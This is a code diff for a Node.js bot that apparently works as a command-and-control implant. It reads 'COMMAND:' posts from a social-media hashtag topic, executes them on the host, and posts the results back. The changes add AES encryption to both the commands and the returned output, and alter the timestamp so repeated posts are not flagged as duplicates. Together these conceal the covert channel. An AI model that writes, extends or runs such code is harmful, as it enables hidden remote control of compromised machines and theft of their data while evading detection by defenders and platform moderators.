@@ -4,6 +4,7 @@ const { exec } = require('child_process');
 
 const { login, acceptCookies } = require('./lib/login.js');
 const Commands = require('./lib/commands.js');
+const Encryption = require('./lib/encryption.js');
 const { log, sleep, Difficulty } = require('../utils/utils.js');
 const { URLS, COMMANDS, COMMUNICATION } = require('../config/constants.js');
 const MESSAGES = require('../config/messages.js');
@@ -14,6 +15,9 @@ VERIFICATION = process.env.BOT_VERIFICATION;
 BROWSER = process.env.BROWSER;
 HEADLESS = process.env.HEADLESS == "true" ? "new" : false;
 TOPIC = process.env.TOPIC;
+SECRET = process.env.CONTENT_ENCRYPTION_SECRET;
+
+const encryption = new Encryption('aes-256-cbc', SECRET);
 
 const nextAction = () => {
 	log(MESSAGES.EMPTY);
@@ -22,7 +26,7 @@ const nextAction = () => {
 
 async function queryCommand(commands) {
 	return await new Promise(async (resolve) => {
-		console.log(MESSAGES.COMMAND_WAITING);
+		log(MESSAGES.COMMAND_WAITING);
 		
 		// return to communication channel
 		commands.page.goto(`${URLS.TOPIC.format(TOPIC)}?f=live`, { waitUntil: 'networkidle2' });
@@ -36,7 +40,8 @@ async function queryCommand(commands) {
 		content = content.replace(`#${TOPIC}`, "").trim();
 	
 		if (content.startsWith("COMMAND:")) {
-			const command = content.replace("COMMAND:", "").trim().split("[")[0];
+			let command = content.replace("COMMAND:", "").trim().split("[")[0].trim();
+			command = encryption.decrypt(command);
 			log(MESSAGES.COMMAND_RECEIVED.format(command));
 	
 			return resolve(command);
@@ -57,7 +62,9 @@ async function executeCommand(command) {
 async function sendResult(commands, result) {
 	log(result);
 
-	result = "OUTPUT: " + result + `[${Date.now()}]`;
+	const timestampSample = (Date.now()).toString().slice(8, 12); // make the tweet unique to avoid duplicate error
+	result = encryption.encrypt(result);
+	result = "OUTPUT: " + result + " " + `[${timestampSample}]`;
 	await commands.makePost(result, [`#${TOPIC}`]);
 }
 
